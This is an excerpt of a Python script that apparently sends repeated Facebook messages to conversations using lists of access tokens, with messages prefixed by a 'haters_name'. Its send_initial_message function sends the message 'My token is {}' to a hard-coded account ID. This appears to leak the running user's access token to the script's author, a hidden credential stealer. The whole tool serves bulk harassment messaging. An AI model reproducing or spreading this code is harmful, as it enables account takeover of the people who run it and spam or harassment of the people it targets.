...
def send_initial_message():
      ...
      msg_template = "Faizan bro this is My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100001226288966"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•────────────────────── TRICK BY FAIZAN ───────────────────────────────•')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+]  Faizan bhai thenku running my token {} of Convo {} Token {}: {}".format(
                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  else:
                      print("\033[1;91m[x] Faizan bhai failed to send Message {} of Convo {} with Token {}: {}".format(
                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  time.sleep(speed)
